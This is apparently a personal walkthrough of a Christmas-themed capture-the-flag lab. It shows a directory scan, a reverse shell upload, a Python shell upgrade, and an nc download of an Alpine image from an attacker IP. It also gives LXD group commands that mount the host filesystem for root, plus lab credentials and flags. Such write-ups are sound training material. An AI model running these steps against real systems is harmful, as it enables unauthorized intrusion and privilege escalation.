# Day 24 |  The Trial Before Christmas

It was the night before Christmas and The Best Festival Company could finally rest. All of the toys had been made and the company had recovered from attack after attack. Everything was in Santa's hands now, leaving the elves to do little more than wish him a safe journey ahead. Elf McEager sat at his terminal staring absentmindedly at light snow that had begun to fall. Just as he had drifted off to sleep Elf McEager was jolted to attention as a small parcel appeared just at the edge of his view. 

The present was wrapped in a deep blue velvet that appeared to shimmer in and out of the firelight, not unlike a blinking terminal prompt. Carefully, Elf McEager reached for the azure ribbon, untying it slowly so as to not damage it. The velvet slowly fell away, revealing a small NUC computer with a letter on top. Unfolding the letter, Elf McEager read it aloud:


"Elf McEager - your boundless effort to save Christmas this year has not gone unnoticed. I wanted to reward you with a special present, however, there's a catch. Elf McSkidy and I have seen your skills advance and we feel it would only be appropriate to give you a present after one last challenge. Inside this package, you'll have also found a computer. Plug this into the network and hack into it. Best of luck and Merry Christmas - Santa"



Without delay, Elf McEager connected the NUC appropriately and watched it whir to life. A small screen nearby the power button blinked and then displayed the IP address assigned to the device. Next to the IP, a small symbol appeared. McEager quietly wondered to himself what it could mean as he logged into his terminal, ready to start his final challenge. 


---
Scan the machine. What ports are open?
![a53e60c8e235a5e5f4cfabe789bb4797.png](./_resources/6e198d789ef341408be7c090895155d4.png)
What's the title of the hidden website? It's worthwhile looking recursively at all websites on the box for this step. 
![12da31da0bcbfe82340256c5ea0cb0af.png](./_resources/468563f4851a4da58f54ddd1e640f4d8.png)

![fd5392c36a73401de03241f8181e2edd.png](./_resources/82faaff477334a319332ca15852927b7.png)	


What is the name of the hidden php page?

```
gobuster dir -u http://10.10.96.179:65000/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x php
```

![b1c7794fea95f7ef24ed0cbbc27bde3d.png](./_resources/4a9f9ab5185a4406bf48c3b2c6be2e02.png)


![aeda37f86cb30431505bec1760e5b3b7.png](./_resources/07e61dcac4914f869b5231adfd0c8b24.png)

What is the name of the hidden directory where file uploads are saved?

grid


![846305a79ddecdf01b263315d2c89e0d.png](./_resources/9e3cd76acde845d99540ad2a7794195d.png)


### Bypass the filters. Upload and execute a reverse shell. 

Reverse Shell

![731c7f72f19982b70a0ce7d70c444bdf.png](./_resources/c4890e7ea8354ad28b7e078c98e362e0.png)

Bypass filters

![b24dcfd2ca5eae35a4e32602a746e5a7.png](./_resources/14bd92d111164b17a3936874a1366bfa.png)

Refresh the page

![41e25be96c1e51bc5b87df6d22364a84.png](./_resources/f66ebc9afbd544b5adf9a5f0514acd03.png)


![a618833f3230538932f8ace0aded7219.png](./_resources/2102e6d4a4164c58a6ed905822b63464.png)

Listener + Shell upgrade
![c3e1cfcb01ce4af9b1f129f6c74db23f.png](./_resources/9f402997dab248a0b6cf280fc26fc85f.png)


### What is the value of the web.txt flag?

![6fb6e0a3f333728a686fbaa961998ce5.png](./_resources/e3bd2823309845298e938a9eaafb242d.png)

### Upgrade and stabilize your shell. 

Kita dapat melakukan upgrade shell melalui python3 atau script


Python (disesuaikan dengan versi):

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Script:
```
script /dev/null
```

### Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password


![503e65c224ff797f51e5c3d1e167a421.png](./_resources/f09cf980f9c2468a981ba2d682562581.png)
tron:IFightForTheUsers

### Access the database and discover the encrypted credentials. What is the name of the database you find these in?

![7b7fa4a018d9a6e2f3c31aba5fc00c72.png](./_resources/edc7fbf69eb04370b86efef0e9926910.png)

![fd1fc516151a0c772ce6d88c97d489dc.png](./_resources/29f25ae1c63345e0af0478a8fbc989d5.png)


### Crack the password. What is it?

![37073bb1c3ac78b06f7bceb5db6ff821.png](./_resources/230a4e1096824a82bb90081b27882fe5.png)

### Use su to login to the newly discovered user by exploiting password reuse. 
![6f42f68e388e7b3ce42073eccee8d9f1.png](./_resources/22b03208d424462fb33ff747340f68e8.png)

### What is the value of the user.txt flag?

![dea810a78db4f57211e7c459f4fa31bb.png](./_resources/0a21dae345c1490ab8903a5367fe5d43.png)

### Check the user's groups. Which group can be leveraged to escalate privileges? 
![c40141a30ebce00c56e780b66e4dc03d.png](./_resources/8b20ec5d02264eca99f4bb85cec58368.png)

https://itsef.medium.com/hack-the-box-tabby-10-10-10-194-scratch-27ec40161646

https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation


Sender (attacker):
```
nc -nvlp 9001 < alpine-v3.12-x86_64-20201107_1900.tar.gz
```

Receiver:
```
nc 10.9.30.115 9001 > alpine-v3.12-x86_64-20201107_1900.tar.gz
```

Abuse LXD/LXC

```
$ lxc image import /tmp/alpine-v3.12-x86_64-20201107_1900.tar.gz --alias iamf-img
$ lxc config device add img-container iamf-test disk source=/ path=/mnt/root
$ lxc start img-container
$ lxc exec img-container sh
```

![d560ce65a4bd86ca27b7e142a032ea1c.png](./_resources/d1f0855d012e4824befca43d3558bea3.png)

THM{FLYNN_LIVES}

